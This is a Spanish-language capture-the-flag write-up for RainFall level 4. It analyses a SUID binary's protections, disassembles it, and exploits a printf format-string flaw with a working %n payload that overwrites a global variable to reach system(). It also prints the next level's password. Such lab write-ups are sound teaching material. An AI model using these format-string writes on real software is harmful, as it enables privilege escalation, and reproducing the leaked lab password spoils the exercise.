# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level4' y sus permisos. 

```bash
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level5`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level4@RainFall:~$ file ./level4 
./level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```

### b). ASLR:
```bash
level3@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level4@RainFall:~$ readelf -l ./level4 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level3@RainFall:~$ nm ./level4 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level4@RainFall:~$ readelf -S ./level4 | grep -E ".got|.plt"
  [10] .rel.plt          REL             080482d0 0002d0 000028 08   A  5  12  4
  [12] .plt              PROGBITS        08048330 000330 000060 04  AX  0   0 16
  [22] .got              PROGBITS        080497d8 0007d8 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        080497dc 0007dc 000020 04  WA  0   0  4

```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

No podemos romper el binario por tamaño de entrada y usamos gdb para desensamblar el binario y poder encontrar la vulnerabilidad. El desbordamiento de buffer clásico es imposible aquí.

```
level4@RainFall:~$ (printf 'A%.0s' {1..600};) | ./level4 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
level4@RainFall:~$
```

# 5. Reverse Engineering (Target Identification):

Análisis de la función `n`

```asm
0x0804848d <+54>: mov    eax,ds:0x8049810           ; Carga el valor en EAX (variable global)
0x08048492 <+59>: cmp    eax,0x1025544              ; Compara ese valor con la constante 16930116 
0x08048497 <+64>: jne    0x80484a5 <n+78>           ; Si NO son iguales, salta al final y termina.
0x08048499 <+66>: mov    DWORD PTR [esp],0x8048590  ; Copia la dirección '0x8048590'
0x080484a0 <+73>: call   0x8048360 <system@plt>     ; Ejecuta `system("/bin/sh")`, la dirección `0x8048590` apunta al string `/bin/sh` o `cat /home/user/level5/.pass`
```

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level4/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level4/source.c).

# 6. Solución: Format String Attack.

-  `main` solo alinea el stack y llama a `n`,`n` lee con `fgets` pero realiza la impresión en `p`.
-  `fgets` limita la lectura, impidiendo un *Buffer Overflow* tradicional.
-  `printf` recibe nuestro buffer sin un string de formato fijo.
-   Modificar la variable global en `0x8049810` para que valga `0x1025544`.

1. Por lo tanto solo podemos atacar el binario dentro de la función `p`
```asm
0x080484ad <+6>:	call   0x8048457 <n>
...
0x0804845a <+3>:	sub    esp,0x218                      ; Reserva de 538 bytes
0x08048471 <+26>:	lea    eax,[ebp-0x208]                ; Límite de 520 bytes (buffer)
0x08048477 <+32>:	mov    DWORD PTR [esp],eax
0x0804847a <+35>:	call   0x8048350 <fgets@plt>          ; ejecuta lo leido en stdin
0x08048488 <+49>:	call   0x8048444 <p>                  ; Llama a la función 'p'
...
0x0804844d <+9>:	mov    DWORD PTR [esp],eax
0x08048450 <+12>:	call   0x8048340 <printf@plt>         ; printea lo liedo por stdin en 'n'
...

```
2. **Identificamos el BACKDOOR**

```asm
0x0804844d <+9>:	mov    DWORD PTR [esp],eax           ⟸
0x08048450 <+12>:	call   0x8048340 <printf@plt>         ; printea lo que recibe.
```

3. **Objetivo:**

Nuestro objetivo es modificar la que la variable global `m` (la que se comparacon `0x1025544`) reside en `0x08049810` para que valga `0x1025544` (16930116).

4. **Cálculo del Offset:**

```
level4@RainFall:~$ ./level4
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 
level4@RainFall:~$ 
```
Al introducir `AAAA` seguido de múltiples `%p`, observamos que el valor hexadecimal `0x41414141` aparece en la posición **12**. Esto nos confirma que nuestro buffer comienza a ser leído por `printf` a partir del duodécimo argumento en el stack.

5. **Construcción del Payload:**

- **\x10\x98\x04\x08:** Escribimos la dirección destino al principio. Ocupa 4 bytes.
- **%16930112d:** Forzamos a `printf` a imprimir una cantidad masiva de caracteres. 16930116(objetivo) −4 (ya escritos) = 16930112.
- **%12$n:** Le decimos a `printf`: "Toma el total de caracteres escritos hasta ahora e inyéctalo en la dirección apuntada por el 12º argumento del stack". Como el 12º argumento es el inicio de nuestro buffer, contiene la dirección 0x08049810.

### ** Ejecución**

```bash
level4@RainFall:~$ (printf "\x10\x98\x04\x08"; printf "%%16930112d%%12\$n"; cat) | ./level4
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$

level4@RainFall:~$ su level5
Password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
level5@RainFall:~$ 

```
6. **Resultado Final**
El programa verifica la condición:
```c
if (m == 0x1025544) {
    system("/bin/sh"); // O cat .pass
}
```
Al cumplirse la igualdad gracias a nuestra inyección, el programa nos devuelve el contenido del archivo .pass de level5.

---

# **7. Conclusión:**

En el **Level 4** continuamos con la vulnerabilidad de **Cadena de Formato (Format String)** pero eleva la complejidad técnica respecto al nivel anterior.


En el **Level 3** el objetivo era un valor pequeño, en este nivel hay que resolver dos problemas. La identificación del **offset** en un stack mas profundo y la escritura de un valor numeŕico masivo.

La vulneravilidad no se encontraba en la función que lee la entrada `n`, sino en la función secundaria `p` que recibe el puntero del buffer.

Mediante analisis del stack con el uso específico de `%p`, determinamos que nuestra entrada se encontraba en el duodécimo (12º) parámetro.

Al manipular con éxito el valor de `m`, el programa validó la condición de seguridad y ejecutó la llamada a system, otorgándonos acceso a la contraseña de `level5`. Este nivel subraya que las protecciones como `fgets` (que evitan el Buffer Overflow limitando el tamaño) son inútiles si el programador permite que el usuario controle los strings de formato de funciones como `printf`.